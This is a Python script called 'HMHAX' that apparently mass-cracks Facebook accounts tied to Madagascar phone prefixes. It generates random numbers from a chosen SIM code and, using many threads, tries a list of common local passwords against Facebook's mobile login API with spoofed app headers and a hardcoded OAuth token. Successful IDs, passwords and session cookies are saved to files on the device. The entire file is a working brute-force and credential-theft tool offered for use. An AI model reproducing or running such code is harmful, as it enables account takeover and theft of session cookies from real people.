import os
import random
import string 
import uuid
import json
import subprocess
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import sys
import secrets
import getpass

# Mot de passe pour déverrouiller le script
mot_de_passe = "HMHAX808"

# Demander à l'utilisateur de saisir le mot de passe
saisie_mot_de_passe = getpass.getpass("INSERER LE PASSCODE : ")

# Vérifier si le mot de passe saisi est correct
if saisie_mot_de_passe == mot_de_passe:
    print("PASSECODE CORRECT✅. Lancement ...")
    
    # Exécuter la commande git pull
    try:
        subprocess.run(["git", "pull"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Erreur lors de l'exécution de git pull : {e}")
        exit(1)
    print("Git pull terminé avec succès !")

#-------------color----------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White

my_color = [B,C,P,H]

warna = random.choice(my_color)

oks=[]

cps=[]

loop=0

# Liste des couleurs pour le logo, les lignes et chaque mot
logo_colors = [B, C, P, H]
line_colors = [bblack, M, H, byellow, bblue, P, C, B]
word_colors = [B, C, P, H, M, byellow, bblue, P, C, B]

#-------------logo-----------------#
logo=(f'''{B}
.__              .__                     
|  |__    _____  |  |__  _____   ___  ___
|  |  \  /     \ |  |  \ \__  \  \  \/  /
|   Y  \|  Y Y  \|   Y  \ / __ \_ >    < 
|___|  /|__|_|  /|___|  /(____  //__/\_ \
     \/       \/      \/      \/       \/
{warna}--------------------------------------------{B}
TOOL NAME : {warna}{P}HMHAX{P}{warna}
Owner: {M}HMHAX{M}
Tricks : {B}Use Airplane Mode every 5min{B}
N.B: {bblue}SIM DATA ONLY DON'T USE WIFI{bblue}
Tool: {warna}[{M}VERSION 1.5{warna}]{warna}
{warna}--------------------------------------------{B}''')

#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')

#-------------clear def -------------#
def clear():
    os.system('clear')
    print(logo)

#-------------main def------------#
def HMHAX():
    clear()
    os.system('xdg-open https://www.facebook.com/profile.php?id=100094326129648')
    print(f'{B} [{warna}01{B}] MG RANDOM CLONING ')
    print(f'{B} [{warna}00{B}] EXIT ')
    linex()
    option=input(f' {B}[{warna}??{B}] MENU >> ')
    if option in ['01','1']:
        BD_CLONING()
    else:
        exit(' Misaotra  :)')

#------------ bd clone def ----------#
def BD_CLONING():
    user = []
    clear()
    print(' MG SIMCODE : [032] [034] [038] [033]')
    code = input(' ENTER SIMCODE >> ')
    linex()
    print(' EX LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit = int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit = 50000
    clear()
    for nmbr in range(limit):
        nmp = ''.join(map(str, generate_random_sequence(9)))
        user.append(nmp)
    with tred(max_workers=60) as Dipto:
        tl = str(len(user))
        print(' TOTAL ACCOUNT : ' + tl)
        print(' YOUR SIM CODE : ' + code)
        print(' CLONING EN COURS ... ')
        linex()
        for psx in user:
            ids = code + psx
            passlist = [
                psx, ids, ids[:7], ids[:6], ids[5:], ids[4:],
                '1234567', 'malala', 'Anjara', 'anjara', 'Antananarivo',
                'Malagasy', 'Judio99', 'Angelina', 'Malala', 'fitiavana',
                'mamako', 'Baby1234', 'babyko', 'Urus1234', 'ferari',
                '12345678', 'Business123', 'Zandriko', 'Papako', 'Zoroluffy',
                'Onepiece', 'Ceasar123', 'Rimka', 'Lune123', '200509',
                'Love123', 'Mylova', 'Lover1234', 'Freefire123', 'Freefire',
                'freefire', 'freefire123', '200609', '200409', '200309',
                '200209', '202403', 'razana', 'Razana', '200109', '200009',
                'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko',
                'badoda', 'badoda', 'mendrika', 'mendrika', 'mendrikarivo',
                'mendrikarivo', 'antananarivo', 'antananarivo', 'marary',
                'marary', 'milely', 'milely', 'Fitiavana', 'vadiko', 'Vadiko',
                'jesosy', 'Jesosy', 'mahery', 'Mahery', 'malagasy', 'Malagasy'
            ]
            Dipto.submit(method_crack, ids, passlist)

    linex()
    print('CLONING FINISHED  ')
    print(' TOTAL OK ID ' + str(len(oks)))
    print(' TOTAL CP ID ' + str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    HMHAX()


# Définition de la fonction pour la méthode de crack
def method_crack(ids, passlist):
    global oks
    global cps
    global loop
    
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            
            datax = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'meta_inf_fbmeta': '',
                'currently_logged_in_userid': '0',
                'fb_api_req_friendly_name': 'authenticate'
            }

            header = {
                'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': '21435',
                'X-FB-Net-HNI': '35793',
                'X-FB-SIM-HNI': '37855',
                'X-FB-Connection-Type': 'unknown',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }

            url = 'https://api.facebook.com/method/auth.login'

            reqx = requests.post(url, data=datax, headers=header).json()

            if 'session_key' in reqx:
                try:
                    uid = reqx['uid']
                except:
                    uid = ids

                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[HMHAX] ' + str(uid) + ' | ' + pas + '\033[1;37m')
                    coki = ";".join(i["name"] + "=" + i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] ' + coki)

                    # Vérifier si le dossier HMHAX-OK.txt existe et le créer si nécessaire
                    if not os.path.exists("/sdcard/HMHAX-OK.txt"):
                        os.makedirs("/sdcard/HMHAX-OK.txt")

                    # Enregistrer dans le fichier HMHAX-OK.txt
                    with open(os.path.join("/sdcard/HMHAX-OK.txt", "HMHAX-OK.txt"), 'a') as f:
                        f.write(str(uid) + '|' + pas + '|' + coki + '\n')

                    oks.append(str(uid))
                    break

            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[HMHAX-CP] ' + ids + ' | ' + pas + '\033[1;37m')

                # Enregistrer dans le fichier HMHAX-CP.txt
                with open(os.path.join("/sdcard/HMHAX-CP.txt", "HMHAX-CP.txt"), 'a') as f:
                    f.write(ids + '|' + pas + '\n')

                cps.append(ids)
                break

            else:
                continue

        loop += 1

    except Exception as e:
        print("Erreur lors de la méthode de crack :", e)
        pass

#-------------end----------------#

# Générateur de séquence aléatoire
def generate_random_sequence(length):
    sequence = [random.choice(string.digits) for _ in range(length)]
    return sequence

# Appel à la fonction HMHAX pour démarrer le programme
HMHAX()
